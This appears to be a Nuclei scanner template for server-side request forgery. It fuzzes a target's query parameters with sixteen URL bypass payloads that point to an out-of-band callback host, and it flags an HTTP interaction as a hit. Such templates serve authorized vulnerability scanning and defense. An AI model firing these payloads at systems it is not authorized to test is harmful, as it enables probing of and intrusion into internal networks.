id: ssrf

info:
  name: SSRF
  author: Maximus Decimus
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      ssrf:
        - "{{interactsh-url}}"
        - "\\/{{interactsh-url}}"
        - "\\/\\/{{interactsh-url}}"
        - "\\\\{{interactsh-url}}"
        - "//{{interactsh-url}}"
        - "//{{Host}}@{{interactsh-url}}"
        - "/\\/{{interactsh-url}}"
        - "https://{{interactsh-url}}%3F.{{Host}}/"
        - "https://{{interactsh-url}}%2523.{{Host}}/"
        - "https://{{interactsh-url}}?c=.{{Host}}/"
        - "//%2F/{{interactsh-url}}"
        - "////{{interactsh-url}}"
        - "https://{{Host}}.{{interactsh-url}}"
        - "/%0D/{{interactsh-url}}"
        - "/%2F/{{interactsh-url}}"
        - "/%5C{{interactsh-url}}"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
        - "{{ssrf}}"

    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the HTTP Interaction
        words:
          - "http"
